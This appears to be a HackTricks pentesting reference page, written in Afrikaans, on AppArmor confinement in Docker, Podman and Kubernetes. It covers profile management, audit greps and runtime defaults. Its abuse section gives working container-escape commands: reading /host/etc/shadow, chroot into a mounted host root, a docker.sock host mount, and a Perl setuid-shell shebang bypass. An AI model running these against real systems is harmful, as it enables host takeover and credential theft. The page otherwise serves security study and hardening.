# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

AppArmor is a **Mandatory Access Control** stelsel wat beperkings toepas deur per-program profiele. Anders as tradisionele DAC-kontroles, wat sterk afhanklik is van gebruiker- en groeps-eienaarskap, laat AppArmor die kernel toe om 'n beleid af te dwing wat aan die proses self gekoppel is. In houer-omgewings maak dit saak omdat 'n werklading dalk genoeg tradisionele voorregte het om 'n aksie te probeer en steeds geweier kan word omdat sy AppArmor-profiel nie die relevante pad, mount, netwerkgedrag, of gebruik van capabilities toelaat nie.

Die belangrikste konseptuele punt is dat AppArmor **padgebaseerd** is. Dit hanteer lêerstelseltoegang deur padreëls eerder as deur etikette soos SELinux doen. Dit maak dit toeganklik en kragtig, maar dit beteken ook dat bind mounts en alternatiewe pad-uitlegte noukeurig nagegaan moet word. As dieselfde host-inhoud onder 'n ander pad bereikbaar raak, mag die effek van die beleid nie wees wat die operateur aanvanklik verwag het nie.

## Rol in houer-isolasie

Houer-sekuriteitsbeoordelings stop dikwels by capabilities en seccomp, maar AppArmor bly saak maak ná daardie kontroles. Stel jou 'n houer voor wat meer voorreg het as wat dit behoort te hê, of 'n werklading wat vir operasionele redes een ekstra capability benodig het. AppArmor kan steeds lêertoegang, mount-gedrag, netwerking en uitvoeringspatrone beperk op maniere wat die voor die hand liggende misbruikpad stop. Dit is waarom om AppArmor "net om die toepassing te laat werk" uit te skakel stilweg 'n slegs riskante konfigurasie kan omskep in een wat aktief uitgebuit kan word.

## Laboratorium

Om te kontroleer of AppArmor op die host aktief is, gebruik:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Om te sien onder watter gebruiker die huidige containerproses loop:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Die verskil is leerzaam. In die normale geval behoort die proses 'n AppArmor-konteks te wys wat gekoppel is aan die profiel wat deur die runtime gekies is. In die unconfined geval verdwyn daardie ekstra beperkende laag.

Jy kan ook nagaan wat Docker dink dit toegepas het:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime-gebruik

Docker kan 'n standaard- of pasgemaakte AppArmor-profiel toepas wanneer die gasheer dit ondersteun. Podman kan ook met AppArmor integreer op stelsels wat op AppArmor gebaseer is, alhoewel op SELinux-gesentreerde verspreidings die ander MAC-stelsel dikwels die hoofrol speel. Kubernetes kan AppArmor-beleid op werkladingvlak blootstel op nodes wat werklik AppArmor ondersteun. LXC en verwante stelselhouer-omgewings in die Ubuntu-familie gebruik AppArmor ook wyd.

Die praktiese punt is dat AppArmor nie 'n "Docker feature" is nie. Dit is 'n gasheer-kern funksie wat verskeie runtimes kan kies om toe te pas. As die gasheer dit nie ondersteun nie of die runtime vertel word om unconfined te hardloop, bestaan die beweerde beskerming nie regtig nie.

Vir Kubernetes spesifiek is die moderne API `securityContext.appArmorProfile`. Sedert Kubernetes `v1.30` is die ouer beta AppArmor-annotasies verouderd. Op ondersteunde gasheers is `RuntimeDefault` die standaardprofiel, terwyl `Localhost` na 'n profiel verwys wat reeds op die node gelaai moet wees. Dit maak saak tydens beoordeling omdat 'n manifest AppArmor-bewus kan lyk terwyl dit steeds heeltemal op node-kant ondersteuning en voorafgelaaide profiele staatmaak.

Een subtiele maar nuttige operasionele detail is dat dit strenger is om uitdruklik `appArmorProfile.type: RuntimeDefault` te stel as om die veld eenvoudig weg te laat. As die veld uitdruklik gestel is en die node AppArmor nie ondersteun nie, behoort toelating te misluk. As die veld weggelaat word, kan die werklading steeds op 'n node sonder AppArmor loop en eenvoudig daardie ekstra beperkinglaag nie ontvang nie. Vanuit 'n aanvaller se oogpunt is dit 'n goeie rede om beide die manifest en die werklike node-toestand na te gaan.

Op Docker-geskikte AppArmor-gasheers is die bekendste standaard `docker-default`. Daardie profiel word gegenereer uit Moby se AppArmor-sjabloon en is belangrik omdat dit verduidelik waarom sommige op vermoëns gebaseerde PoCs steeds in 'n standaard container misluk. In breë terme laat `docker-default` gewone netwerking toe, weier dit skryfaksies op 'n groot deel van `/proc`, weier dit toegang tot sensitiewe dele van `/sys`, blokkeer dit mount-operasies, en beperk dit ptrace sodat dit nie 'n algemene gasheer-sonderoek primitif is nie. Om daardie basislyn te verstaan help om te onderskei tussen "die container het `CAP_SYS_ADMIN`" en "die container kan daardie vermoë inderdaad teen die kern-koppelvlakke wat my interesseer gebruik".

## Profielbestuur

AppArmor profiles word gewoonlik gestoor onder `/etc/apparmor.d/`. 'n Algemene benoemingskonvensie is om skuinsstrepe in die uitvoerbare pad deur punte te vervang. Byvoorbeeld, 'n profiel vir `/usr/bin/man` word gewoonlik gestoor as `/etc/apparmor.d/usr.bin.man`. Hierdie detail maak saak tydens beide verdediging en assessering omdat sodra jy die aktiewe profielnaam ken, jy dikwels die ooreenstemmende lêer vinnig op die gasheer kan opspoor.

Nuttige gasheer-kant bestuurskommandos sluit in:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
### Bou en Opdateer Profiele

Die rede waarom hierdie opdragte saakmaak in ’n container-sekuriteit verwysing is dat hulle verduidelik hoe profiele eintlik gebou, gelaai, na complain mode geskakel, en aangepas word ná veranderinge aan ’n aansoek. As ’n operateur die gewoonte het om profiele tydens foutopsporing na complain mode te skuif en vergeet om enforcement te herstel, kan die container in dokumentasie beskerm lyk terwyl dit in die werklikheid baie losser optree.

`aa-genprof` kan die toepassingsgedrag waarneem en help om ’n profiel interaktief te genereer:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kan 'n sjabloonprofiel genereer wat later met `apparmor_parser` gelaai kan word:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wanneer die binaire verander en die beleid opgedateer moet word, kan `aa-logprof` weierings wat in die logs gevind is herhaal en die operateur help besluit of om dit toe te laat of te weier:
```bash
sudo aa-logprof
```
### Logs

AppArmor-weierings is dikwels sigbaar deur `auditd`, syslog, of gereedskap soos `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Dit is nuttig operasioneel en offensief. Verdedigers gebruik dit om profiele te verfyn. Aanvallers gebruik dit om te bepaal watter presiese pad of bewerking geweier word en of AppArmor die beheer is wat 'n exploit chain blokkeer.

### Identifisering van die presiese profiellêer

Wanneer 'n runtime 'n spesifieke AppArmor profielnaam vir 'n container vertoon, is dit dikwels nuttig om daardie naam terug te koppel aan die profiellêer op die skyf:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Dit is veral nuttig tydens host-side review omdat dit die gaping oorbrug tussen "die container sê dit hardloop onder profile `lowpriv`" en "die werklike reëls woon in hierdie spesifieke lêer wat geoudit of herlaai kan word".

### Belangrike reëls om te oudit

As jy 'n profile kan lees, beperk jou nie tot eenvoudige `deny`-reëls nie. Verskeie reëlsoorte verander werklik hoe nuttig AppArmor teen 'n container escape-poging sal wees:

- `ux` / `Ux`: voer die teiken-binary unconfined uit. As 'n bereikbare helper, shell, of interpreter onder `ux` toegelaat word, is dit gewoonlik die eerste ding om te toets.
- `px` / `Px` en `cx` / `Cx`: voer profile-transisies uit by exec. Dit is nie outomaties sleg nie, maar dit is die moeite werd om te oudit omdat 'n transisie in 'n veel breër profile as die huidige kan beland.
- `change_profile`: laat 'n taak toe om in 'n ander gelaaide profile oor te skakel, onmiddellik of by volgende exec. As die bestemming-profile swakker is, kan dit die beoogde ontsnappingsroute uit 'n beperkende domein word.
- `flags=(complain)`, `flags=(unconfined)`, of die nuwer `flags=(prompt)`: dit behoort te verander hoeveel vertroue jy in die profile plaas. `complain` teken weierings aan in plaas daarvan om dit af te dwing, `unconfined` verwyder die grens, en `prompt` hang af van 'n userspace-besluitpad eerder as 'n suiwer deur-kernel-afgedwonge deny.
- `userns` of `userns create,`: nuwer AppArmor-beleid kan die skepping van user namespaces bemiddel. As 'n container profile dit eksplisiet toelaat, bly geneste user namespaces in spel selfs wanneer die platform AppArmor as deel van sy verstevigingsstrategie gebruik.

Nuttige host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
This soort oudit is dikwels meer nuttig as om na honderde gewone lêerreëls te staar. As 'n breakout afhang van die uitvoering van 'n helper, binnetree in 'n nuwe namespace, of ontsnap na 'n minder beperkende profile, is die antwoord dikwels versteek in hierdie oorgang-georiënteerde reëls eerder as in die voor die hand liggende `deny /etc/shadow r` stylreëls.

## Miskonfigurasies

Die mees opvallende fout is `apparmor=unconfined`. Administrateurs stel dit dikwels terwyl hulle 'n toepassing debug wat misluk het omdat die profile korrek iets gevaarliks of onverwagts geblokkeer het. As die vlag in produksie bly, is die hele MAC-laag effektief verwyder.

Nog 'n subtiele probleem is die aanname dat bind mounts onskadelik is omdat die lêertoestemmings normaal lyk. Aangesien AppArmor path-based is, kan die blootstelling van host paths onder alternatiewe mount-lokasies sleg reageer met path reëls. 'n Derde fout is om te vergeet dat 'n profile name in 'n konfigurasielêer baie min beteken as die gasheer-kern nie eintlik AppArmor afdwing nie.

## Misbruik

Wanneer AppArmor weg is, mag operasies wat voorheen beperk was skielik werk: lees van sensitiewe paths deur bind mounts, toegang tot dele van procfs of sysfs wat moeilikerr moes bly om te gebruik, uitvoering van mount-verwante aksies as capabilities/seccomp dit ook toelaat, of die gebruik van paths wat 'n profile normaalweg sou weier. AppArmor is dikwels die meganisme wat verduidelik waarom 'n capability-based breakout attempt op papier "moet werk" maar in praktyk steeds faal. Verwyder AppArmor, en dieselfde poging kan begin sukses hê.

As jy vermoed AppArmor is die hoofrede waarom 'n path-traversal, bind-mount, of mount-based misbruikketting stop, is die eerste stap gewoonlik om te vergelyk wat toeganklik word met en sonder 'n profile. Byvoorbeeld, as 'n host path binne die container gemount is, begin deur te toets of jy dit kan deurstap en lees:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
As die container ook 'n gevaarlike bevoegdheid soos `CAP_SYS_ADMIN` het, is een van die mees praktiese toetse om te kyk of AppArmor die beheer is wat mount-operasies of toegang tot sensitiewe kern-lêerstelsels blokkeer:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In omgewings waar 'n host path reeds via 'n bind mount beskikbaar is, kan die verlies van AppArmor ook 'n read-only information-disclosure issue omskep in direkte host file access:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Die doel van hierdie opdragte is nie dat AppArmor alleen die breakout skep nie. Die punt is dat, sodra AppArmor verwyder is, baie filesystem- en mount-based abuse paths onmiddellik toetsbaar raak.

### Volledige voorbeeld: AppArmor Uitgeskakel + Host Root Mounted

As die container reeds die host root bind-mounted by `/host` het, kan die verwydering van AppArmor 'n geblokkeerde filesystem abuse path in 'n volledige host escape omskep:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sodra die shell via die host-lêerstelsel uitgevoer word, het die workload effektief die kontenergrens ontsnap:
```bash
id
hostname
cat /etc/shadow | head
```
### Volledige voorbeeld: AppArmor uitgeschakel + Runtime Socket

As die werklike hindernis AppArmor rondom die runtime state was, kan 'n gemonteerde socket genoeg wees vir 'n volledige escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Die presiese pad hang af van die mount point, maar die eindresultaat is dieselfde: AppArmor keer nie meer toegang tot die runtime API nie, en die runtime API kan 'n host-kompromitterende container lanseer.

### Volledige Voorbeeld: Path-Based Bind-Mount Bypass

Omdat AppArmor padgebaseerd is, beskerm die beskerming van `/proc/**` nie outomaties dieselfde host procfs-inhoud as dit via 'n ander pad bereikbaar is nie:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Die impak hang af van wat presies gemount is en of die alternatiewe pad ook ander kontroles omseil, maar hierdie patroon is een van die duidelikste redes waarom AppArmor saam met die mount-opstelling eerder as geïsoleerd geëvalueer moet word.

### Volledige voorbeeld: Shebang Bypass

AppArmor-beleid mik soms 'n interpreterpad op 'n wyse wat nie ten volle rekening hou met skripuitvoering deur shebang-hantering nie. 'n Historiese voorbeeld het behels die gebruik van 'n skrip waarvan die eerste lyn na 'n beperkte interpreter wys:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Hierdie soort voorbeeld is belangrik as 'n herinnering dat die bedoeling van 'n profiel en die werklike uitvoeringsemantiek kan verskil. Wanneer AppArmor in container environments nagegaan word, verdien interpreterkettings en alternatiewe uitvoerpaaie besondere aandag.

## Kontroles

Die doel van hierdie kontroles is om drie vrae vinnig te beantwoord: is AppArmor op die host aangeskakel, is die huidige proses begrens, en het die runtime werklik 'n profiel op hierdie container toegepas?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Wat hier interessant is:

- As `/proc/self/attr/current` `unconfined` toon, kry die workload geen voordeel van AppArmor-inperking nie.
- As `aa-status` wys dat AppArmor gedeaktiveer is of nie gelaai is nie, is enige profielnaam in die runtime-konfigurasie meestal kosmeties.
- As `docker inspect` `unconfined` of 'n onverwagte aangepaste profiel toon, is dit dikwels die rede waarom 'n filesystem- of mount-based abuse path werk.
- As `/sys/kernel/security/apparmor/profiles` nie die profiel bevat wat jy verwag het nie, is die runtime- of orchestrator-konfigurasie op sigself nie voldoende nie.
- As 'n veronderstelde geharde profiel `ux`, uitgebreide `change_profile`, `userns`, of `flags=(complain)` styl reëls bevat, mag die praktiese grens baie swakker wees as wat die profielnaam aandui.

As 'n container reeds verhoogde voorregte het vir operationele redes, maak dit dikwels die verskil tussen 'n beheerde uitsondering en 'n veel wyer sekuriteitsfaling om AppArmor aangeskakel te laat.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Vir AppArmor is die belangrikste veranderlike dikwels die **host**, nie net die runtime nie. 'n Profielinstelling in 'n manifest skep nie inperking op 'n node waar AppArmor nie geaktiveer is nie.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
